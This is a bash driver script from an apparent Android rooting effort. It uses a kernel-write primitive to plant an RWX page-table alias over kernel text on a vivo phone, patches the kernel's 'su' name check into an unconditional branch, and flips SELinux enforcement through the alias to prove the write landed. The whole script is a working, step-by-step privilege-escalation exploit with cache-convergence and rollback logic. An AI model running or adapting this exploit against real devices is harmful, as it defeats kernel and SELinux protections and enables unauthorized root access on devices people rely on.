#!/usr/bin/env bash
# §175/§178 driver: defeat the vivo kernel's 'su' name gate with 2 kernel writes and no
# partition/BL change.  Everything numeric comes from tools/pgdalias.py --shell, which
# asserts its own premises against fw/Image + art/kallsyms_real.txt before it emits them.
#
#   write 1  pgd slot 511 (empty by construction) -> a 1 GB RWX alias of the low 1 GB of
#            RAM, i.e. a writable window onto .text at a brand-new VA (no stale TLB).
#   write 2  the gate's b.ne -> unconditional b, through that alias.
#   between them a HARMLESS proof: write the .text data island's own zero bytes back
#   through the alias -- readv reaching the end means "alias live AND that page writable".
#   then converge the caches per CPU (tools/icache_sync) and measure.
#
# The verdict ruler is tools/sugate_probe: control_su must go errno=1 -> RAN while
# control_sux stays RAN.  CRITICAL premise: the caller has to be uid 2000 -- the gate
# exempts any zero id, so a root shell would make the test pass vacuously.
#
# usage: bash tools/run_sugate.sh [serial]
#        ROUNDS=16 bash tools/run_sugate.sh       # more clobber attempts per write
#        HOTPLUG=1 bash tools/run_sugate.sh       # also cycle cpu1..N (icache via online)
set -u
SER=${1:-3e5a38a5}
ADB="adb -s $SER"
DEV=/data/local/tmp
T="$(dirname "$0")"
CLOBBER_ROUNDS=${ROUNDS:-10}
HOTPLUG=${HOTPLUG:-0}
FLIP=${FLIP:-0}          # 1 = allow the §173-style fallback (clear AP[2] on a possibly-live entry)

fail() { printf 'ABORT: %s\n' "$*" >&2; exit 1; }
step() { printf '\n=== %s ===\n' "$*"; }

# Leave an artifact: the derived constants, every readv/expected pair, and the per-cpu
# verdict table.  LOGF="" disables it (used by the mock rehearsal).
LOGF=${LOGF-auto}
if [ "$LOGF" != "" ]; then
	[ "$LOGF" = auto ] && LOGF="$T/../art/sugate-$(date +%Y%m%d-%H%M%S).txt"
	mkdir -p "$(dirname "$LOGF")" && exec > >(tee -a "$LOGF") 2>&1
	printf '[log] %s\n' "$LOGF"
fi

# ---- constants, only if every premise holds ---------------------------------------
PROFILE=${PROFILE:-6.0.1}
step "0. derive constants (profile $PROFILE: asserts against the Image + kallsyms + iomem)"
CONST=$(python3 "$T/pgdalias.py" --profile "$PROFILE" --shell) || fail "pgdalias.py refused to emit constants -- do not write anything"
eval "$CONST" || fail "pgdalias emitted something that is not KEY=VALUE -- refusing to run on partial constants"
COMMON_KEYS="ALIAS_ENTRY_VA ALIAS_DESC_HEX ALIAS_GATE ALIAS_ISLAND GATE_ORIG_HEX GATE_PATCH_HEX WRI_READV FAULT_READV \
	 ALIAS_ENTRY_LIST ALIAS_GATE_LIST ALIAS_ISLAND_LIST GATE_PRIMARY_VA FLIP_ENTRY_VA FLIP_RO_HEX FLIP_RW_HEX \
	 WITNESS_PRIMARY WITNESS_NAME WITNESS_KIND"
case "${WITNESS_KIND:-}" in
	enforce)  KEYS="$COMMON_KEYS ALIAS_SELINUX_LIST SELINUX_PRIMARY ENF_ON_HEX ENF_OFF_HEX" ;;
	modprobe) KEYS="$COMMON_KEYS ALIAS_WITNESS_LIST" ;;
	*) fail "pgdalias emitted WITNESS_KIND='${WITNESS_KIND:-}' -- expected enforce or modprobe" ;;
esac
for v in $KEYS; do
	[ -n "${!v:-}" ] || fail "pgdalias did not provide $v"
	printf '  %-16s %s\n' "$v" "${!v}"
done
# 4 bytes on purpose: §159 measured the full/short pair (69644/69632) with exactly this
# payload geometry, so the island probe stays comparable to the known-good readings.
ZERO_ISLAND=00000000


[ -x "$T/clobber" ] || fail "build tools/clobber first"
[ -x "$T/sugate_probe" ] || fail "build tools/sugate_probe first"
[ -x "$T/sgt_pay" ] || fail "build tools/sgt_pay first (sugate_probe's payload)"
[ -x "$T/icache_sync" ] || fail "build tools/icache_sync first"
[ -x "$T/elflush" ] || fail "build tools/elflush first (per-line EL0 cache maintenance)"
# A binary older than its source means either a failed compile or an edit that never got
# rebuilt -- both have already cost this project a phone reboot.  Refuse to ship them.
for f in clobber sugate_probe sgt_pay icache_sync elflush; do
	[ "$T/$f.c" -nt "$T/$f" ] && fail "$T/$f is STALE (its .c is newer). rebuild then re-run"
done

$ADB get-state >/dev/null 2>&1 || fail "device $SER not present"

# ---- 1. ship -----------------------------------------------------------------------------------
step "1. ship tools"
for f in clobber sugate_probe sgt_pay icache_sync elflush; do
	$ADB push "$T/$f" "$DEV/$f" >/dev/null 2>&1 || fail "push $f"
done
$ADB shell "chmod 0755 $DEV/clobber $DEV/sugate_probe $DEV/sgt_pay $DEV/icache_sync $DEV/elflush" >/dev/null

# Pre-flight, before ANY kernel write: icache_sync's I side needs mmap(PROT_EXEC) of a
# file, which is an SELinux permission we have never exercised on this device (the daily
# path is execve, which is a different permission). Learning this here costs one command;
# learning it after the patch would leave a patched-but-unconverged kernel.
step "1b. pre-flight: is the I-side cache sweep actually usable here?"
PRE=$( $ADB shell "$DEV/icache_sync -1 $DEV/ict.bin" 2>&1 | tr -d '\r' )
printf '  %s\n' "$(printf '%s' "$PRE" | tail -1)"
if printf '%s' "$PRE" | grep -q "EXEC CONTROL FAIL"; then
	SWEEP_OK=0
	printf '  WARNING: executing a mapped file is denied here => the I-side sweep is unavailable.\n'
	printf '           Convergence will rely on exec-churn (each probe runs ~50 execves) plus\n'
	printf '           HOTPLUG=1 for cpu1..N. The alias/patch steps are unaffected.\n'
else
	SWEEP_OK=1
	printf '  I-side sweep usable (exec control passed)\n'
fi

# (ii) elflush: two questions we have never measured on this phone, both answerable with
# zero kernel state touched -- it maps one file page twice, which is the same two-VA
# geometry the pgd alias gives us on the kernel side.
#   a) does the kernel let EL0 execute dc cvau / ic ivau at all (SCTLR_EL1.UCI), and
#   b) does that sequence actually change what a patched instruction returns here.
# If both say yes, convergence after the patch names the gate's cache line instead of
# hoping an 8 MB eviction sweep threw it out -- and CPU0, which can never be offlined,
# converges like every other core.  "ALLOWED" alone is not enough: whether the op reaches
# a TTBR1 (privileged) line is only decided by the verdict after the patch.
step "1c. pre-flight: can EL0 flush one line by VA on this SoC?"
ELF=$( $ADB shell "$DEV/elflush selftest $DEV/elf.bin" 2>&1 | tr -d '\r' )
printf '%s\n' "$ELF" | sed 's/^/  /'
ELFLUSH_OK=0
printf '%s' "$ELF" | grep -q "ops at EL0: ALLOWED" && ELFLUSH_OK=1
[ "$ELFLUSH_OK" = "1" ] || printf '  => per-line flush unavailable; convergence = eviction sweeps + HOTPLUG only\n'
# Same ops, but aimed at the gate's real (TTBR1) line while the kernel is still pristine.
# Invalidating a clean text line cannot change behaviour, so if anything surprising happens
# -- a signal, a hang -- it is reported here rather than being mistaken for "the patch did
# not converge" after step 4.
PROBE=$( $ADB shell "$DEV/elflush probe $GATE_PRIMARY_VA" 2>&1 | tr -d '\r' )
printf '  on the real target: %s\n' "$(printf '%s' "$PROBE" | grep -E 'probe|VERDICT' | tr '\n' ' ')"
if printf '%s' "$PROBE" | grep -q TRAPPED; then
	ELFLUSH_OK=0
	printf '  => allowed on user lines, TRAPPED on kernel lines: convergence is sweeps-only\n'
fi


# ---- 2. the gate must actually be denying us, as uid 2000 --------------------------------------
probe_once() { $ADB shell "$DEV/sugate_probe" 2>&1 | tr -d '\r'; }
gate_lines() { probe_once | grep -E "CASE (control_su|control_sux) " | tr '\n' ' '; }
must_be_shell() {
	local uid enf
	uid=$($ADB shell id -u | tr -d '\r')
	enf=$($ADB shell getenforce | tr -d '\r')
	[ "$uid" = "2000" ] || fail "caller uid is $uid, not 2000 -- the gate exempts uid 0, so a verdict now would be vacuous"
	printf '  caller uid=%s  getenforce=%s\n' "$uid" "$enf"
	ENF_BASELINE="$enf"
}
step "2. baseline: uid 2000 must be denied on the name 'su', allowed on 'sux'"
must_be_shell
BASE=$(gate_lines)
printf '  baseline: %s\n' "$BASE"
# NB: 'control_su' is a prefix of 'control_sux' -- anchor the label with its arrow, or a
# line where only sux ran would read as "su denied" (and later, as "su allowed").
echo "$BASE" | grep -qE "CASE control_su +-> errno=1" || fail "control_su is not errno=1 at baseline -- the gate is not what we think (or already patched)"
echo "$BASE" | grep -qE "CASE control_sux +-> RAN" || fail "control_sux does not run at baseline -- the ruler is broken, do not proceed"

# ---- 3. clobber helper (readv is the in-kernel witness) ----------------------------------------
# The oracle is clobber's own pair: it prints "readv = A (expected B)" where B is the length
# of the feed it built, so A==B means every byte (payload + marker) reached the target.
# A fault at the first payload byte costs (payload+8) => 69632 for a 4-byte payload, and the
# SAME 69632 for an 8-byte one -- so comparing a raw readv against 69632 would let a
# partially-landed 8-byte write through.  Length-independent equality is what we use.
# "no hit"             : the batch missed the slot (a race), nothing was written -- retry
kwrite() { # kwrite <tries> <addr> <hexpayload> -> "readv/expected"; rc 0 only on a full copy
	local tries=$1 addr=$2 pay=$3 i out got="" want=""
	for i in $(seq "$tries"); do
		out=$($ADB shell "$DEV/clobber $CLOBBER_ROUNDS kern $addr hex:$pay 4 0" 2>&1 | tr -d '\r')
		got=$(printf '%s\n' "$out" | sed -n 's/.*readv = \([0-9]*\) (expected \([0-9]*\).*/\1/p')
		want=$(printf '%s\n' "$out" | sed -n 's/.*readv = \([0-9]*\) (expected \([0-9]*\).*/\2/p')
		# the exact oracle: clobber sums its own feed, so readv==expected means every byte
		# (payload + marker) reached the target -- independent of payload length, which is how
		# the 8-byte pgd write gets judged too instead of trusting a hardcoded 69644.
		[ -n "$got" ] && [ "$got" = "$want" ] && { printf '%s/%s\n' "$got" "$want"; return 0; }
		if [ -n "$got" ] && [ -z "$want" ] && [ "$got" != "$FAULT_READV" ]; then
			printf '%s/?\n' "$got"; return 0          # older clobber: fall back to the short-read signature
		fi
		printf '    try %s: %s\n' "$i" "$(printf '%s' "$out" | grep -E 'RESULT|readv' | tr '\n' ' ')" >&2
		sleep 1
	done
	printf '%s/%s\n' "${got:-none}" "${want:-none}"
	return 1
}

# ---- 2b. the channel itself, judged on a known-writable word, with no semantic effect ------------
# §174 left the hit rate degraded (4x8 rounds empty), so "the alias write missed" and "the
# channel is dead today" look identical downstream.  selinux_enforcing is the address §159
# measured as writable, and writing its OWN current value back is a no-op -- if getenforce
# changes, the write landed wrong and we stop before touching a page table.
step "2b. sanity: one no-op write to the known-writable .bss object"
if [ "$WITNESS_KIND" = "modprobe" ]; then
	# /proc/sys/kernel/modprobe re-reads the buffer on every cat, so a landed write is visible
	# from outside the kernel without touching SELinux at all.
	MOD0=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
	[ "${#MOD0}" -ge 4 ] || fail "modprobe reads '$MOD0' -- need >=4 printable chars to use it as a witness"
	case "$MOD0" in *[![:print:]]*) fail "modprobe string has non-printable bytes -- refusing" ;; esac
	ORIG4_HEX=$(printf '%s' "${MOD0:0:4}" | od -An -tx1 | tr -d ' \n')
	MUT4_HEX=$(printf '/zz' | od -An -tx1 | tr -d ' \n')00
	MUT_WANT="/zz"
	S=$(kwrite 6 "$WITNESS_PRIMARY" "$ORIG4_HEX") ||
		fail "the write channel is not landing today ($S) -- do not spend the alias attempt"
	printf '  no-op write of %s (="%s") to %s: %s (readv/expected)\n' "$ORIG4_HEX" "${MOD0:0:4}" "$WITNESS_NAME" "$S"
	MOD1=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
	[ "$MOD1" = "$MOD0" ] || fail "$WITNESS_NAME went '$MOD0' -> '$MOD1' on a NO-OP payload: the write landed WRONG -- stop"
	printf '  %s still "%s" => the channel lands and the payload was right\n' "$WITNESS_NAME" "$MOD1"
else
	case "$ENF_BASELINE" in
		Enforcing) SANITY_HEX="$ENF_ON_HEX" ;;
		Permissive) SANITY_HEX="$ENF_OFF_HEX" ;;
		*) fail "getenforce said '$ENF_BASELINE' -- cannot pick a no-op payload"
	esac
	S=$(kwrite 6 "$WITNESS_PRIMARY" "$SANITY_HEX") ||
		fail "the write channel is not landing today ($S) -- do not spend the alias attempt; check §174 hit-rate state"
	printf '  no-op write of %s to %s: %s (readv/expected)\n' "$SANITY_HEX" "$WITNESS_NAME" "$S"
	NOW_ENF=$($ADB shell getenforce | tr -d '\r')
	[ "$NOW_ENF" = "$ENF_BASELINE" ] || fail "getenforce went $ENF_BASELINE -> $NOW_ENF on a no-op payload: the write landed WRONG -- stop"
	printf '  getenforce still %s => the channel lands and the payload was right\n' "$NOW_ENF"
fi

read -ra ENTRIES <<< "$ALIAS_ENTRY_LIST"
read -ra AGATES  <<< "$ALIAS_GATE_LIST"
read -ra ISLANDS <<< "$ALIAS_ISLAND_LIST"
if [ "$WITNESS_KIND" = "modprobe" ]; then
	read -ra WALS <<< "$ALIAS_WITNESS_LIST"
else
	read -ra WALS <<< "$ALIAS_SELINUX_LIST"
	# The alias must be proven by something a stale cache cannot fake.  Writing the .text island's
	# own zero bytes back only shows readv reached the end -- and today that same signature came from
	# a window aimed at the WRONG physical base (PA 0x80000000 instead of the measured 0x40000000),
	# because a batch whose redirect never happened also consumes the whole feed.  Data reads are
	# coherent, so flipping SELinux through the alias and back is a witness with content.
	if [ "$ENF_BASELINE" = "Enforcing" ]; then
		OPP_HEX="$ENF_OFF_HEX"; OPP_WANT="Permissive"
	else
		OPP_HEX="$ENF_ON_HEX"; OPP_WANT="Enforcing"
	fi
	CUR_HEX="$ENF_ON_HEX"; [ "$ENF_BASELINE" = "Permissive" ] && CUR_HEX="$ENF_OFF_HEX"
fi
[ "${#WALS[@]}" = "${#ENTRIES[@]}" ] || fail "pgdalias emitted ${#ENTRIES[@]} slots but ${#WALS[@]} witness aliases"

alias_proof() { # alias_proof <alias-VA-of-the-witness> ; rc 0 only if the outside read moved and came back
	local wal=$1 now
	if [ "$WITNESS_KIND" = "modprobe" ]; then
		kwrite 4 "$wal" "$MUT4_HEX" >/dev/null || { printf 'the mutate write did not land'; return 1; }
		sleep 1
		now=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
		if [ "$now" != "$MUT_WANT" ]; then
			printf 'wrote %s through the alias, %s reads "%s" (wanted "%s")' "$MUT4_HEX" "$WITNESS_NAME" "$now" "$MUT_WANT"
			kwrite 4 "$WITNESS_PRIMARY" "$ORIG4_HEX" >/dev/null   # restore by the proven path
			return 1
		fi
		kwrite 4 "$wal" "$ORIG4_HEX" >/dev/null || { printf 'mutated but the restore write missed'; return 1; }
		sleep 1
		now=$(timeout 20 $ADB shell cat /proc/sys/kernel/modprobe 2>&1 | tr -d '\r')
		if [ "$now" != "$MOD0" ]; then
			printf 'alias moved it but did not restore ("%s"); fixing via the primary VA' "$now"
			kwrite 4 "$WITNESS_PRIMARY" "$ORIG4_HEX" >/dev/null
			return 1
		fi
		printf '%s went "%s" -> "%s" -> "%s" through the alias alone' "$WITNESS_NAME" "$MOD0" "$MUT_WANT" "$MOD0"
		return 0
	fi
	kwrite 4 "$wal" "$OPP_HEX" >/dev/null || { printf 'the flip write did not land'; return 1; }
	sleep 1
	now=$( $ADB shell getenforce | tr -d '\r' )
	if [ "$now" != "$OPP_WANT" ]; then
		printf 'wrote %s through the alias, getenforce is %s (wanted %s)' "$OPP_HEX" "$now" "$OPP_WANT"
		kwrite 4 "$SELINUX_PRIMARY" "$CUR_HEX" >/dev/null   # restore by the proven path
		return 1
	fi
	now=""
	kwrite 4 "$wal" "$CUR_HEX" >/dev/null || { printf 'flipped but the restore write missed'; return 1; }
	sleep 1
	now=$( $ADB shell getenforce | tr -d '\r' )
	if [ "$now" != "$ENF_BASELINE" ]; then
		printf 'alias flipped it but did not restore (%s); fixing via the primary VA' "$now"
		kwrite 4 "$SELINUX_PRIMARY" "$CUR_HEX" >/dev/null
		return 1
	fi
	printf 'getenforce went %s -> %s -> %s through the alias alone' "$ENF_BASELINE" "$OPP_WANT" "$ENF_BASELINE"
	return 0
}

GATE_TARGET=""
step "3. open an alias -- try each empty pgd slot, and PROVE it semantically before using it"
for i in "${!ENTRIES[@]}"; do
	entry=${ENTRIES[$i]}; agate=${AGATES[$i]}; wal=${WALS[$i]}
	printf '  candidate %s: entry=%s gate=%s witness-alias=%s (%s)\n' "$((i + 1))" "$entry" "$agate" "$wal" "$WITNESS_NAME"
	if entry_rc=$(kwrite 4 "$entry" "$ALIAS_DESC_HEX"); then
		printf '    entry write %s (readv/expected) -- 8 bytes matter, a partial landing would show here\n' "$entry_rc"
	else
		printf '    entry write did not land (%s), next candidate\n' "$entry_rc"
		continue
	fi
	if why=$(alias_proof "$wal"); then
		printf '  => alias PROVEN (%s): the window addresses the same bytes as the primary VA\n' "$why"
		GATE_TARGET="$agate"
		break
	fi
	printf '    alias not proven: %s\n' "$why"
	printf '    that slot maps something else (or nothing); the descriptor write itself is inert\n'
done

if [ -z "$GATE_TARGET" ] && [ "$FLIP" = "1" ]; then
	printf '\n  falling back to the §173 idea with a COMPUTED value (FLIP=1):\n'
	printf '    clear AP[2] on the 2 MB block entry %s (%s -> %s).\n' "$FLIP_ENTRY_VA" "$FLIP_RO_HEX" "$FLIP_RW_HEX"
	printf '    RISK: unlike an empty pgd slot, this entry may not be what we think; a wrong guess there\n'
	printf '          edits a live mapping and can oops the phone (owner already accepted that).\n'
	kwrite 6 "$FLIP_ENTRY_VA" "$FLIP_RW_HEX" >/dev/null || printf '    flip write did not land\n'
	probe=$(kwrite 6 "$GATE_PRIMARY_VA" "$GATE_ORIG_HEX")
	if [ $? -eq 0 ]; then
		printf '    no-op write-back of the original word at the primary VA: %s => flip worked\n' "$probe"
		GATE_TARGET="$GATE_PRIMARY_VA"
	else
		printf '    no-op write-back still short (%s) => that entry was not the live one\n' "$probe"
	fi
fi
[ -n "$GATE_TARGET" ] || fail "no writable window onto .text. Not patched; nothing live was modified unless FLIP=1 was set."

# ---- 4/5. the actual patch -----------------------------------------------------------------------------------
step "4. write the patch: gate b.ne -> b, one word at $GATE_TARGET"
R=$(kwrite 6 "$GATE_TARGET" "$GATE_PATCH_HEX") || fail "patch write never landed (last readv/expected=$R)"
printf '  %s <- %s : %s (readv/expected)\n' "$GATE_TARGET" "$GATE_PATCH_HEX" "$R"


step "5. converge the caches and measure, cheapest method first"
NCPU=$(( $( $ADB shell 'cat /sys/devices/system/cpu/present' | tr -d '\r' | sed 's/.*-//' ) ))
printf '  cpus: 0..%s\n' "$NCPU"

# Which cache lines have to converge: the gate word's real VA, plus -- when the alias
# route was used -- the alias VA the store actually went through.  Both are issued on
# every CPU, because a dirty L1D line can only be cleaned by the core holding it and a
# stale L1I line only discarded by the core that cached it.  (Same set index either way:
# the two VAs differ above bit 12, and the L1 tags are physical.)
ORIG_VA="$GATE_PRIMARY_VA"
ALIAS_VA="$GATE_TARGET"

converge_line() {
	local c
	if [ "$ELFLUSH_OK" != "1" ]; then
		printf '  skipped: EL0 cannot issue dc cvau/ic ivau here (see 1c)\n'
		return 0
	fi
	for c in $(seq 0 "$NCPU"); do
		printf '    cpu%s: %s\n' "$c" "$( $ADB shell "CPU=$c $DEV/elflush sync $ORIG_VA $ALIAS_VA" 2>&1 | tr -d '\r' | grep -E 'VERDICT|TRAPPED' | tr '\n' ' ' )"
	done
}

converge_sweep() {
	local c
	for c in $(seq 0 "$NCPU"); do
		printf '    cpu%s: %s\n' "$c" "$( $ADB shell "$DEV/icache_sync $c $DEV/ict.bin" 2>&1 | tr -d '\r' | tail -1 )"
	done
	[ "$SWEEP_OK" = "1" ] || printf '  (I-side was unavailable; the D-side sweep still ran -- see 1b)\n'
}

converge_hotplug() {
	local c probe
	probe=$( $ADB shell 'echo 0 > /sys/devices/system/cpu/cpu1/online 2>&1; echo $?' | tr -d '\r' | tail -1 )
	if [ "$probe" != "0" ]; then
		printf '  skipped: cpuN/online is not writable as uid %s (needs the temp-root channel)\n' "$($ADB shell id -u | tr -d '\r')"
		return 0
	fi
	printf '  cycling cpu1..%s offline/online (the up path runs ic iallu; cpu0 is never touched)\n' "$NCPU"
	for c in $(seq 1 "$NCPU"); do
		$ADB shell "echo 0 > /sys/devices/system/cpu/cpu$c/online; sleep 1; echo 1 > /sys/devices/system/cpu/cpu$c/online; sleep 1" 2>&1 | tr -d '\r' | sed 's/^/    /'
	done
}

# verdict <rounds> -- the ruler is tools/sugate_probe: control_su must go errno=1 -> RAN
# while control_sux keeps running.  Anchored greps: 'control_su' is a prefix of
# 'control_sux', so an unanchored pattern matches a line where only sux ran.
# rc: 0 = defeated, 1 = measured and still denied, 2 = NO READING (harness failure).
verdict() {
	local rounds=$1 c r line
	for c in $(seq 0 "$NCPU"); do
		for r in $(seq 1 "$rounds"); do
			line=$( $ADB shell "$DEV/sugate_probe $c" 2>&1 | tr -d '\r' | grep -E "CASE (control_su|control_sux) " | tr '\n' ' ' )
			if ! echo "$line" | grep -qE "CASE control_su +-> "; then
				printf '  cpu%s r%s: NO READING -- probe gave no verdict line\n' "$c" "$r" >&2
				printf '  raw: %s\n' "$( $ADB shell "$DEV/sugate_probe $c" 2>&1 | tr -d '\r' | head -3 | tr '\n' ' ' )" >&2
				return 2
			fi
			printf '  cpu%s r%s: %s\n' "$c" "$r" "$line"
			if echo "$line" | grep -qE "CASE control_su +-> RAN" && echo "$line" | grep -qE "CASE control_sux +-> RAN"; then
				printf '\n  GATE DEFEATED on cpu%s round %s (su RAN, sux still RAN)\n' "$c" "$r"
				printf '  converged by: %s\n' "$method"
				printf '  getenforce now: %s (was %s)\n' "$($ADB shell getenforce | tr -d '\r')" "$ENF_BASELINE"
				printf '  where the patch sits: %s ; undo = adb reboot (memory only, no partition touched)\n' "$GATE_TARGET"
				return 0
			fi
		done
	done
	return 1
}

# run_verdict <rounds> -- exit 0 on a defeat; on a *missing* reading keep going but remember
# it, because "no line came back" is not evidence that the gate still denies.  Never exit
# without the rollback path having run.
NOREAD=0
run_verdict() {
	local rc=0
	verdict "$1" || rc=$?
	[ "$rc" = 2 ] && NOREAD=1
	[ "$rc" = 0 ] && exit 0
	return 0
}

method="line flush (dc cvau + ic ivau per CPU)"
[ "$ELFLUSH_OK" = "1" ] || method="no convergence step (the patched line was simply re-fetched)"
converge_line
run_verdict 3

method="eviction sweeps (icache_sync per CPU)"
converge_sweep
run_verdict 5

if [ "$HOTPLUG" = "1" ]; then
	method="cpu online/offline cycle"
	converge_hotplug
	run_verdict 5
fi

if [ "$NOREAD" = "1" ]; then
	printf '\n  MEASUREMENT FAILED: at least one probe round returned no verdict line.\n' >&2
	printf '  That is NOT a reading of "still denied" -- nothing is concluded about convergence.\n' >&2
fi
printf '\n  NOT YET: su never showed RAN on any cpu that could be measured.\n' >&2
printf '  Rolling the instruction word back so the gate stays as shipped (target %s): ' "$GATE_TARGET" >&2
if kwrite 6 "$GATE_TARGET" "$GATE_ORIG_HEX" >&2; then
	printf '  rollback landed -- the gate is again as shipped, and the alias entry can be\n' >&2
	printf '  zeroed the same way (%s <- 0000000000000000) if a clean slate is wanted.\n' "$ALIAS_ENTRY_VA" >&2
else
	printf '  ROLLBACK DID NOT LAND: the patched word is still in kernel text.  Until it is\n' >&2
	printf '  written back (or the phone reboots) the gate is modified -- treat the device as\n' >&2
	printf '  patched, not as "nothing happened".  Retry: kwrite 6 %s %s\n' "$GATE_TARGET" "$GATE_ORIG_HEX" >&2
fi
printf '  The writable window itself was proven in step 3, so a persistent miss points at the\n' >&2
printf '  caches or the patch site, not at the write (ledger §178/§182 decide those offline).\n' >&2
printf '  If 1c said "TRAPPED" and the sweeps were also unusable (1b), convergence on CPU0 is\n' >&2
printf '  the open question -- reboot restores the shipped gate either way.\n' >&2
[ "$GATE_TARGET" = "$GATE_PRIMARY_VA" ] && \
	printf '  NOTE: the FLIP fallback left that 2 MB block writable until reboot -- decide deliberately.\n' >&2
exit 1
